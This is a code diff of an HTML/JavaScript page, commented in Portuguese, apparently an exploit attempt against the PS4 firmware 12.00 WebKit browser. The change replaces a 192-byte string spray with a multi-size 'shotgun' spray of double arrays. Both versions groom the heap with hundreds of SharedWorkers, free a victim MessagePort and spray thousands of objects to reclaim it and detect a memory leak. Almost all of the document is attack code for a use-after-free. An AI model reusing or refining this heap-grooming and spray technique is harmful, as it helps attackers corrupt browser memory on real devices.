@@ -2,15 +2,15 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 STRING ATTACK (0xC0)</title>
+    <title>PS4 12.00 SHOTGUN SPRAY</title>
     
 </head>
 <body>
 
-    <h1>ALVO: 0xC0 (192 bytes) - STRING MODE</h1>
-    <h3>Tática: Usar Strings para furar o IsoHeap</h3>
+    <h1>PS4 12.00 - SHOTGUN SPRAY</h1>
+    <h3>Estratégia: Inundar com múltiplos tamanhos (0x60 - 0x140)</h3>
     
-    <button onclick="run_string_attack()">DISPARAR STRINGS</button>
+    <button onclick="run_shotgun()">DISPARAR ESCOPETA</button>
     <div id="status">Pronto.</div>
     <div id="log"></div>
 
@@ -23,56 +23,65 @@
         }
 
         // =================================================================
-        // 1. PAYLOAD: STRING DE 192 BYTES
+        // 1. CONFIGURAÇÃO MULTI-CALIBRE
         // =================================================================
-        // No WebKit, Strings têm um header.
-        // Para ocupar 192 bytes (0xC0) no bloco de memória, a string deve ter
-        // um tamanho específico de caracteres.
-        // Header (24 bytes em 64-bit) + Caracteres * 2 (UTF-16) = 192
-        // (192 - 24) / 2 = 84 caracteres.
-        // Vamos testar 84 chars.
-        
-        function build_string_payload() {
-            var len = 84; 
-            var str = "";
-            // Padrão "A" (0x0041) repetido
-            // Se lido como ponteiro, vira 0x00410041... (Userland seguro ou Crash limpo)
-            for(var i=0; i<len; i++) {
-                str += "A";
+        // Lista de todos os tamanhos suspeitos para objetos WebKit pequenos
+        var SHOTGUN_SIZES = [
+            0x60, 0x70, 0x80, 
+            0x90, 0xA0, 0xB0, 
+            0xC0, 0xD0, 0xE0, 
+            0x100, 0x120, 0x140
+        ];
+
+        // Cache dos payloads prontos
+        var PAYLOADS = {};
+
+        function prepare_ammo() {
+            log("Preparando munição (Double Arrays)...");
+            
+            for (let size of SHOTGUN_SIZES) {
+                // Header do Array ~= 16 bytes.
+                // Elementos = (Tamanho - 16) / 8
+                var count = Math.floor((size - 16) / 8);
+                if (count < 1) count = 1;
+                
+                var arr = new Array(count);
+                // Preenche com 1.1 (0x3FF1...)
+                // Seguro para Userland, fatal se lido como ponteiro Kernel
+                for(var k=0; k<arr.length; k++) arr[k] = 1.1;
+                
+                PAYLOADS[size] = arr;
             }
-            return str;
+            log(`${SHOTGUN_SIZES.length} calibres prontos.`);
         }
 
         // =================================================================
         // 2. EXECUÇÃO
         // =================================================================
         var workers = [];
-        var strings_stash = []; // Segura as strings na memória
 
-        async function run_string_attack() {
+        async function run_shotgun() {
             if(!window.SharedWorker) return log("Erro: Navegador.");
             
-            var payload = build_string_payload();
-            log(`Payload String construído (${payload.length} chars).`);
+            prepare_ammo();
 
-            // 1. GROOMING (380)
-            log("Grooming (Base)...");
+            // GROOMING (380)
+            log("Grooming...");
             for(let i=0; i<380; i++) {
                 try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
             }
 
-            // 2. TRIGGER (403)
-            // Zona de pressão máxima sem crashar
-            var count = 0;
+            // TRIGGER (403)
+            var p_count = 0;
             var limit = 403 - 380;
 
             var it = setInterval(() => {
-                if (count >= limit) {
+                if (p_count >= limit) {
                     clearInterval(it);
                     
-                    log("!!! DISPARANDO NO 403 !!!");
+                    log("!!! DISPARANDO !!!");
                     
-                    // Vítima
+                    // VÍTIMA
                     var v = workers.pop();
                     var p = v.port;
                     
@@ -80,16 +89,20 @@
                     v.port.close();
                     v = null;
                     
-                    // SPRAY DE STRINGS (Reclaim)
-                    // Strings são alocadas muito rápido. Faremos muitas.
-                    log("Injetando 50.000 Strings...");
-                    for(var k=0; k<50000; k++) {
-                        // Cria string nova a cada vez para forçar alocação
-                        // Adiciona índice no final para evitar desduplicação do motor JS
-                        // Mas mantendo o tamanho fixo (removemos chars do inicio para compensar o indice)
-                        var suffix = k.toString();
-                        var s = payload.substring(suffix.length) + suffix;
-                        strings_stash.push(s);
+                    // SHOTGUN SPRAY
+                    // Injeta todos os tamanhos em sequência rápida
+                    // Isso "suja" todos os baldes de alocação próximos
+                    log("Spraying Múltiplo...");
+                    
+                    var spray_stash = [];
+                    
+                    // 5000 cópias de CADA tamanho
+                    // Total: ~60.000 objetos. Seguro para a RAM (alguns MBs).
+                    for (let size of SHOTGUN_SIZES) {
+                        var ammo = PAYLOADS[size];
+                        for(let k=0; k<5000; k++) {
+                            spray_stash.push(ammo.slice(0));
+                        }
                     }
 
                     // CHECK
@@ -97,38 +110,37 @@
                         try {
                             var s = p.toString();
                             
-                            // Se a string substituiu o objeto, o 'vtable pointer' agora é 0x00410041...
-                            // O navegador vai tentar chamar a função toString nesse endereço.
-                            // Isso DEVE crashar (Panic ou WebPage Error).
-                            
                             if (s.indexOf("MessagePort") === -1) {
                                 log("!!! SUCESSO ABSOLUTO !!!", "success");
-                                log("Objeto virou String!", "success");
-                                alert("LEAK ENCONTRADO VIA STRING!");
+                                log("Objeto Corrompido: " + s, "success");
+                                alert("LEAK ENCONTRADO! Algum tamanho funcionou.");
                             } else {
-                                log("Falha: Objeto ainda é MessagePort.");
-                                // Tenta ler propriedade para forçar o uso do ponteiro corrompido
-                                var temp = p.onmessage;
+                                log("Falha: Objeto intacto.");
+                                // Força bruta final
+                                try { let x = p.onmessage; } catch(e) {
+                                    if(e.toString().match(/0x/)) alert("LEAK NO ERRO: " + e);
+                                }
                             }
                         } catch(e) {
-                            log("ERRO DE MEMÓRIA (BOM SINAL): " + e, "success");
+                            log("ERRO CRÍTICO (BOM): " + e, "success");
                         }
                         
-                        // Se não deu panic ainda, tenta forçar mais uma vez
-                        try { p.postMessage("DIE"); } catch(e){}
-
+                        // Limpeza
+                        workers.forEach(w => { try{w.port.close()}catch(e){} });
+                        spray_stash = [];
+                        
                     }, 500);
                     
                     return;
                 }
                 
                 try {
-                    let w = new SharedWorker("data:text,1", "v"+count);
+                    let w = new SharedWorker("data:text,1", "v"+p_count);
                     w.port.start();
                     workers.push(w);
                 } catch(e){}
-                count++;
-            }, 50);
+                p_count++;
+            }, 60);
         }
     </script>
 </body>
